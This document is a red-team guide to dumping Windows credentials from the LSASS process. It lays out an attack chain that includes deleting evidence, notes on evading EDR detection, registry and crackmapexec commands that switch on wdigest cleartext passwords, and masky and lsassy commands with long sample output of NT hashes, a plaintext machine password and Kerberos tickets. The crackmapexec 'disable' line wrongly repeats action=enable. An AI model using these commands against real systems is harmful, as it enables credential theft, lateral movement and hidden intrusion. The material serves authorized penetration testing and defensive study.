<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Windows Credential Dumping Guide
## References
* [https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/](https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/)
* [https://skelsec.medium.com/duping-av-with-handles-537ef985eb03](https://skelsec.medium.com/duping-av-with-handles-537ef985eb03)
* References
	* @splinter_code blog: The Hidden Side of SecLogon Part 1 and 2 -<br />[https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html](https://splintercod3.blogspot.com/p/the-hidden-side-of-seclogon-part-2.html)
	* [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)

## Example Attacks

* <details><summary>BLS Classic (Click to expand)</summary><p>
	* Process
		1. Upload `Procdump.exe` to the target system
			* `smbclient.py`
		1. Dump `Lsass` process with `Procdump` ([TTP](TTP/T1003_OS_Credential_Dumping/001_LSASS_Memory/T1003.001.md))
		1. Download the dump file
		1. Clean up ([TTP](TTP/T1070_Indicator_Removal_on_Host/004_File_Deletion/T1070.004.md))
		1. Use `Mimikatz` or `Pypykatz` to read the dump file on your local Kali box ([TTP](TTP/T1003_OS_Credential_Dumping/001_LSASS_Memory/T1003.001.md))
		1. Extract a Kerberos ticket from the dump file with `Pypykatz` ([TTP](TTP/T1558_Steal_or_Forge_Kerberos_Tickets/003_Kerberoasting/T1558.003.md))
		1. Authenticate to the machine with the ticket instead of a hash or password ([TTP](TTP/T1550_Use_Alternate_Authentication_Material/003_Pass_the_Ticket/T1550.003.md))
		1. Recover local credentials using `secretsdump.py` ([TTP](TTP/T1003_OS_Credential_Dumping/002_Security_Account_Manager/T1003.002.md))


## Overview

Several TTPs are consistently present through the tools described:

* [`OS Credential Dumping` TTP](TTP/T1003_OS_Credential_Dumping/T1003.md)

* For the "one time sign-in" function of Windows, lsass.exe is use to hold credentials for use as needed
	* <details><summary>Dumping `lsass.exe` (Click to expand)</summary><p>
		* Common Approach
			* Note
				* The drawback 
					* So it means that if you want to get one of those process handles in your process you still need to open a handle to lsass to duplicate it.
			* Process
				1. Open a process handle to the lsass PID through an `OpenProcess` call with the access `PROCESS_QUERY_INFORMATION` and `PROCESS_VM_READ`
					* Where Detected: Usage of `OpenProcess/NtOpenProcess`
					* The kernel allows driver registration of several callback routines for thread, process, and desktop handle operations. `ObRegisterCallbacks` can achieve these functions.
						* Required Structs to register a new callback
							* `OB_CALLBACK_REGISTRATION`
							* `OB_OPERATION_REGISTRATION`.
								* Allows you to specify a combination of parameters to monitor any newly created/duplicate process handle directly from the kernel. 
								* Sysmon event id 10 targets this mechanism
				1. Use `MiniDumpWriteDump` to read all the process address space of lsass and save it into a file on the disk.
					* Note: `MiniDumpWriteDump` relies on the usage of the `NtReadVirtualMemory` system call, allowing read of remote processes
					* The second detection position is usually over the usage of `NtReadVirtualMemory`, which also used internally by `ReadProcessMemory`.
						* Detection (varies)
							* Most Common Approach
								* Inline Hooking to intercept `NtReadVirtualMemory` calls that target the **lsass** process.
									* The problem with this approach is that the monitoring occurs at the same ring level of the process itself, so techniques like direct system calls or unhooking would easily bypass this kind of detection.
							* Modern/effective EDR Approach (Better Option)
								* Use the Threat Intelligence ETW to receive notifications directly from the kernel on specific functions invocation.
									* Example: Whenever a `NtReadVirtualMemory` is called, the kernel function `EtwTiLogReadWriteVm` will be used to track the usage and send the event to the registered consumers.
	* <details><summary>Known Dump Methods for Common Approach (Click to expand)</summary><p>
		* `@matteomalvica` and `@b4rtik` blog post: Win Defender ATP Cred Bypass -<br />[https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/](https://www.matteomalvica.com/blog/2019/12/02/win-defender-atp-cred-bypass/)
			* Create a snapshot of the process in order to perform indirect memory reads by using the snapshot handle. The snapshot handle is then used in the MiniDumpWriteDump call instead of using the target process handle directly. 
		* `@SkelSec` Duping AV with handles -<br />[https://skelsec.medium.com/duping-av-with-handles-537ef985eb03](https://skelsec.medium.com/duping-av-with-handles-537ef985eb03)
			* Reuses already opened handles to the lsass process thus avoiding a direct OpenProcess call on lsass.
		* `@_EthicalChaos_` Dumping LSASS in memory undetected using MirrorDump -<br />[https://www.pentestpartners.com/security-blog/dumping-lsass-in-memory-undetected-using-mirrordump/](https://www.pentestpartners.com/security-blog/dumping-lsass-in-memory-undetected-using-mirrordump/)
			* Load an arbitrary LSA plugin that performs a duplication of the lsass process handle from the lsass process into the dumping process. So the dumping process has a ready to use process handle to lsass without invoking OpenProcess.
		* Alternative
			I want to mention a specific thing about the technique of reusing already opened lsass handles. While it's a very valid technique, it has the clear disadvantage that on most systems you won't easily find a handle holder that's not lsass itself. You can verify it with a simple handles enumerator tool:

### Tips and Tricks Beforehand
#### wdigest
* <details><summary>wdigest (Click to expand)</summary><p>
	* References
	* Overview
		* wdigest is a setting causes the passwords contained in memory to be present in cleartext
		* wdigest is disabled by default in "newer" systems, and should be returned to disabled before leaving any engagement
		* A user must log in again after wdigest is enabled for the password to appear in memory in cleartext
			* Note this caveat when resetting settings to a secure mode

##### Modify wdigest Process ([`Modify Authentication Process` TTP](TTP/T1556_Modify_Authentication_Process/T1556.md))
###### Linux
* <details><summary>crackmapexec (Click to expand)</summary><p>
	* Enable

			crackmapexec smb <target> -u <username> -p <password> -M wdigest -o action=enable
	* Disable

			crackmapexec smb <target> -u <username> -p <password> -M wdigest -o action=enable

###### Windows
* <details><summary>Local (Click to expand)</summary><p>
	* Enable
		* `reg`
		
				reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1
	* Disable
		* `reg`

				reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 0
* <details><summary>Requirements (Click to expand)</summary><p>
	* Windows Privilege
		* `SeDebugPrivilege`
	* For modern machines, Windows Defender prevents PowerShell processes from accessing LSASS. CMD or .NET tools must be used instead.

### Credential Dumping Process
#### From a Linux Machine
* LOLBAS and Sysinternals
	* <details><summary>Notes, References (Click to expand)</summary><p>
		* LOLBAS Project -<br />[https://lolbas-project.github.io/#t1003](https://lolbas-project.github.io/#t1003)
		* Quick retrieve Sysinternals for LOLBAS attacks

				wget https://download.sysinternals.com/files/SysinternalsSuite.zip
	* PKINIT-based (Active Directory)
		* <details><summary>masky (Click to expand) -<br />[https://github.com/Z4kSec/Masky](https://github.com/Z4kSec/Masky)</summary><p>
			* References
			* Examples
				* Example 1

						root@jack-Virtual-Machine:~/Masky# masky -v -d $DOMAIN -u $LOCAL_ADMIN -p $PASSWORD -ca ca.$DOMAIN\\MICROSOFTDELIVERY-CA-CA win11.$DOMAIN
					* Example Output (Unsuccessful Dump, Session Missing)

							root@jack-Virtual-Machine:~/Masky# masky -d $DOMAIN -u $DOMAIN_ADMIN -p $PASSWORD -ca ca.$DOMAIN\\MICROSOFTDELIVERY-CA-CA win11                                          

							  __  __           _
							 |  \/  | __ _ ___| | ___   _ 
							 | |\/| |/ _` / __| |/ / | | |
							 | |  | | (_| \__ \   <| |_| |
							 |_|  |_|\__,_|___/_|\_\__,  |
							  v0.0.3                 |___/

							[*] Loading options...                                     
							[*] 1 target(s) loaded
							[+] (win11) Current user seems to be local administrator, attempting to run Masky agent...
							[*] (win11) No user session was hijacked
							[*] Exiting...
	* comsvcs
		* <details><summary>lsassy (Click to expand) -<br />[https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)</summary><p>
			* References
				* [https://twitter.com/HackAndDo/status/1447970760593711105](https://twitter.com/HackAndDo/status/1447970760593711105)
				* [https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)
			* Example Commands
				* comsvcs (default)
					* This method only uses built-in Windows files to extract remote credentials. It uses minidump function from comsvcs.dll to dump lsass process.

							lsassy -u $LOCAL_ADMIN -p $PASSWORD -d $DOMAIN -K $WORKDIR/Kerberos-Outfolder -f <format, e.g., pretty> -o outfile.txt <target>
						* <details><summary>Example Output (Click to expand)</summary><p>

								lsassy -u 'domain_admin' -p 'P@ssw0rd' -d 'domain.com' -K Kerberos -f pretty -o outfile.txt 10.0.0.60
								SUCCESS:root:Authentication successful
								[+] 10.0.0.60 Authentication successful
								SUCCESS:root:Lsass dumped in C:\Windows\Temp\OwGcbY.fnt (55581140 Bytes)
								[+] 10.0.0.60 Lsass dumped in C:\Windows\Temp\OwGcbY.fnt (55581140 Bytes)
								SUCCESS:root:Lsass dump deleted
								[+] 10.0.0.60 Lsass dump deleted
								SUCCESS:root:MICROSOFTDELIVE\domain_admin        [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
								[+] 10.0.0.60 MICROSOFTDELIVE\domain_admin        [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
								SUCCESS:root:MICROSOFTDELIVE\WIN11$              [NT] a0a3b45f929e097b3454477231a43e28 | [SHA1] 56b9281e7e24256f026ddee862d2d841695413e7
								[+] 10.0.0.60 MICROSOFTDELIVE\WIN11$              [NT] a0a3b45f929e097b3454477231a43e28 | [SHA1] 56b9281e7e24256f026ddee862d2d841695413e7
								SUCCESS:root:domain.com\WIN11$        [PWD] [0Ix-4M0R*6QSOG;A`@bYjFVeH7&'vQn*ZRpHMeJd=S1+'/5qL)H;vH)DXSzp_8[?_q']zxDX5m;\+[Q^<h5`W^kg#<zQT^gYa_dHPP\OaW$ThgSG`=UT*>K
								[+] 10.0.0.60 domain.com\WIN11$        [PWD] [0Ix-4M0R*6QSOG;A`@bYjFVeH7&'vQn*ZRpHMeJd=S1+'/5qL)H;vH)DXSzp_8[?_q']zxDX5m;\+[Q^<h5`W^kg#<zQT^gYa_dHPP\OaW$ThgSG`=UT*>K
								SUCCESS:root:MICROSOFTDELIVE\domain_user         [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
								[+] 10.0.0.60 MICROSOFTDELIVE\domain_user         [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
								SUCCESS:root:DOMAIN.COM\domain_admin  [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:14 (TGT_DOMAIN.COM_domain_admin_krbtgt_DOMAIN.COM_53b91a0b.kirbi)
								[+] 10.0.0.60 DOMAIN.COM\domain_admin  [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:14 (TGT_DOMAIN.COM_domain_admin_krbtgt_DOMAIN.COM_53b91a0b.kirbi)
								SUCCESS:root:DOMAIN.COM\domain_admin  [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:14 (TGT_DOMAIN.COM_domain_admin_krbtgt_DOMAIN.COM_375a9e7f.kirbi)
								[+] 10.0.0.60 DOMAIN.COM\domain_admin  [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:14 (TGT_DOMAIN.COM_domain_admin_krbtgt_DOMAIN.COM_375a9e7f.kirbi)
								SUCCESS:root:DOMAIN.COM\domain_admin  [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:13 (TGT_DOMAIN.COM_domain_admin_krbtgt_DOMAIN.COM_6e2f1491.kirbi)
								[+] 10.0.0.60 DOMAIN.COM\domain_admin  [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:13 (TGT_DOMAIN.COM_domain_admin_krbtgt_DOMAIN.COM_6e2f1491.kirbi)
								SUCCESS:root:DOMAIN.COM\domain_user   [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:07 (TGT_DOMAIN.COM_domain_user_krbtgt_DOMAIN.COM_a88b0199.kirbi)
								[+] 10.0.0.60 DOMAIN.COM\domain_user   [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:07 (TGT_DOMAIN.COM_domain_user_krbtgt_DOMAIN.COM_a88b0199.kirbi)
								SUCCESS:root:DOMAIN.COM\domain_user   [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:07 (TGT_DOMAIN.COM_domain_user_krbtgt_DOMAIN.COM_8b453c42.kirbi)
								[+] 10.0.0.60 DOMAIN.COM\domain_user   [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:07 (TGT_DOMAIN.COM_domain_user_krbtgt_DOMAIN.COM_8b453c42.kirbi)
								SUCCESS:root:DOMAIN.COM\WIN11$        [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:02 (TGT_DOMAIN.COM_WIN11$_krbtgt_DOMAIN.COM_4e7fda28.kirbi)
								[+] 10.0.0.60 DOMAIN.COM\WIN11$        [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:02 (TGT_DOMAIN.COM_WIN11$_krbtgt_DOMAIN.COM_4e7fda28.kirbi)
								SUCCESS:root:DOMAIN.COM\WIN11$        [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:02 (TGT_DOMAIN.COM_WIN11$_krbtgt_DOMAIN.COM_824abab7.kirbi)
								[+] 10.0.0.60 DOMAIN.COM\WIN11$        [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:02 (TGT_DOMAIN.COM_WIN11$_krbtgt_DOMAIN.COM_824abab7.kirbi)
								SUCCESS:root:DOMAIN.COM\WIN11$        [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:01 (TGT_DOMAIN.COM_WIN11$_krbtgt_DOMAIN.COM_035c7523.kirbi)
								[+] 10.0.0.60 DOMAIN.COM\WIN11$        [TGT] Domain: DOMAIN.COM - End time: 2022-08-04 01:01 (TGT_DOMAIN.COM_WIN11$_krbtgt_DOMAIN.COM_035c7523.kirbi)
								SUCCESS:root:Credentials saved to outfile.txt
								[+] 10.0.0.60 Credentials saved to outfile.txt
								SUCCESS:root:25 Kerberos tickets written to /root/lsassy/Kerberos
								[+] 10.0.0.60 25 Kerberos tickets written to /root/lsassy/Kerberos
								SUCCESS:root:8 masterkeys saved to /root/.config/lsassy/masterkeys.txt
								[+] 10.0.0.60 8 masterkeys saved to /root/.config/lsassy/masterkeys.txt
				* comsvcs_stealth

						lsassy -m comsvcs_stealth -u $LOCAL_ADMIN -p $PASSWORD -d $DOMAIN -K $WORKDIR/Kerberos-Outfolder -f <format, e.g., pretty> -o outfile.txt <target>
					* <details><summary>Example Output (Click to expand)</summary><p>

							lsassy -m comsvcs_stealth -u 'domain_admin' -p 'P@ssw0rd' -d 'microsoftdelivery.com' -K Kerberos -f pretty -o outfile2.txt 10.0.0.60
							SUCCESS:root:Authentication successful
							[+] 10.0.0.60 Authentication successful
							SUCCESS:root:Comsvcs.dll copied
							[+] 10.0.0.60 Comsvcs.dll copied
							SUCCESS:root:Lsass dumped in C:\Windows\Temp\3XyHYoW.otf (55544244 Bytes)
							[+] 10.0.0.60 Lsass dumped in C:\Windows\Temp\3XyHYoW.otf (55544244 Bytes)
							SUCCESS:root:Lsass dump deleted
							[+] 10.0.0.60 Lsass dump deleted
							SUCCESS:root:MICROSOFTDELIVE\domain_admin        [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
							[+] 10.0.0.60 MICROSOFTDELIVE\domain_admin        [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
							SUCCESS:root:MICROSOFTDELIVE\WIN11$              [NT] a0a3b45f929e097b3454477231a43e28 | [SHA1] 56b9281e7e24256f026ddee862d2d841695413e7
							[+] 10.0.0.60 MICROSOFTDELIVE\WIN11$              [NT] a0a3b45f929e097b3454477231a43e28 | [SHA1] 56b9281e7e24256f026ddee862d2d841695413e7
							SUCCESS:root:microsoftdelivery.com\WIN11$        [PWD] [0Ix-4M0R*6QSOG;A`@bYjFVeH7&'vQn*ZRpHMeJd=S1+'/5qL)H;vH)DXSzp_8[?_q']zxDX5m;\+[Q^<h5`W^kg#<zQT^gYa_dHPP\OaW$ThgSG`=UT*>K
							[+] 10.0.0.60 microsoftdelivery.com\WIN11$        [PWD] [0Ix-4M0R*6QSOG;A`@bYjFVeH7&'vQn*ZRpHMeJd=S1+'/5qL)H;vH)DXSzp_8[?_q']zxDX5m;\+[Q^<h5`W^kg#<zQT^gYa_dHPP\OaW$ThgSG`=UT*>K
							SUCCESS:root:MICROSOFTDELIVE\domain_user         [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
							[+] 10.0.0.60 MICROSOFTDELIVE\domain_user         [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
							SUCCESS:root:MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_53b91a0b.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_53b91a0b.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_375a9e7f.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_375a9e7f.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:13 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_6e2f1491.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:13 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_6e2f1491.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_a88b0199.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_a88b0199.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_8b453c42.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_8b453c42.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_4e7fda28.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_4e7fda28.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_824abab7.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_824abab7.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:01 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_035c7523.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:01 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_035c7523.kirbi)
							SUCCESS:root:Credentials saved to outfile2.txt
							[+] 10.0.0.60 Credentials saved to outfile2.txt
							SUCCESS:root:25 Kerberos tickets written to /root/lsassy/Kerberos
							[+] 10.0.0.60 25 Kerberos tickets written to /root/lsassy/Kerberos
							SUCCESS:root:8 masterkeys saved to /root/.config/lsassy/masterkeys.txt
							[+] 10.0.0.60 8 masterkeys saved to /root/.config/lsassy/masterkeys.txt
	* procdump
		* <details><summary>lsassy (Click to expand) -<br />[https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)</summary><p>
			* References
			* Methods
				* This method uploads procdump.exe from SysInternals to dump lsass process.
				* procdump

						lsassy -m procdump -u $LOCAL_ADMIN -p $PASSWORD -d $DOMAIN -K $WORKDIR/Kerberos-Outfolder -f <format, e.g., pretty> -o outfile.txt <target>
					* <details><summary>Example Output (Click to expand)</summary><p>

							lsassy -m procdump --options procdump_path=binaries/procdump64.exe -u 'domain_admin' -p 'P@ssw0rd' -d 'microsoftdelivery.com' -o outfile4.txt 10.0.0.60
							SUCCESS:root:Authentication successful
							[+] 10.0.0.60 Authentication successful
							SUCCESS:root:procdump uploaded
							[+] 10.0.0.60 procdump uploaded
							SUCCESS:root:Lsass dumped in C:\Windows\Temp\K0u0.dmp (56426100 Bytes)
							[+] 10.0.0.60 Lsass dumped in C:\Windows\Temp\K0u0.dmp (56426100 Bytes)
							SUCCESS:root:Lsass dump deleted
							[+] 10.0.0.60 Lsass dump deleted
							SUCCESS:root:MICROSOFTDELIVE\domain_admin        [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
							[+] 10.0.0.60 MICROSOFTDELIVE\domain_admin        [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
							SUCCESS:root:MICROSOFTDELIVE\WIN11$              [NT] a0a3b45f929e097b3454477231a43e28 | [SHA1] 56b9281e7e24256f026ddee862d2d841695413e7
							[+] 10.0.0.60 MICROSOFTDELIVE\WIN11$              [NT] a0a3b45f929e097b3454477231a43e28 | [SHA1] 56b9281e7e24256f026ddee862d2d841695413e7
							SUCCESS:root:microsoftdelivery.com\WIN11$        [PWD] [0Ix-4M0R*6QSOG;A`@bYjFVeH7&'vQn*ZRpHMeJd=S1+'/5qL)H;vH)DXSzp_8[?_q']zxDX5m;\+[Q^<h5`W^kg#<zQT^gYa_dHPP\OaW$ThgSG`=UT*>K
							[+] 10.0.0.60 microsoftdelivery.com\WIN11$        [PWD] [0Ix-4M0R*6QSOG;A`@bYjFVeH7&'vQn*ZRpHMeJd=S1+'/5qL)H;vH)DXSzp_8[?_q']zxDX5m;\+[Q^<h5`W^kg#<zQT^gYa_dHPP\OaW$ThgSG`=UT*>K
							SUCCESS:root:MICROSOFTDELIVE\domain_user         [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
							[+] 10.0.0.60 MICROSOFTDELIVE\domain_user         [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
							SUCCESS:root:MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_53b91a0b.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_53b91a0b.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_375a9e7f.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_375a9e7f.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:13 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_6e2f1491.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:13 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_6e2f1491.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_a88b0199.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_a88b0199.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_8b453c42.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_8b453c42.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_4e7fda28.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_4e7fda28.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_824abab7.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_824abab7.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:01 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_8bbd4baa.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:01 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_8bbd4baa.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:01 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_035c7523.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:01 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_035c7523.kirbi)
							SUCCESS:root:Credentials saved to outfile4.txt
							[+] 10.0.0.60 Credentials saved to outfile4.txt
							SUCCESS:root:30 Kerberos tickets written to /root/.config/lsassy/tickets
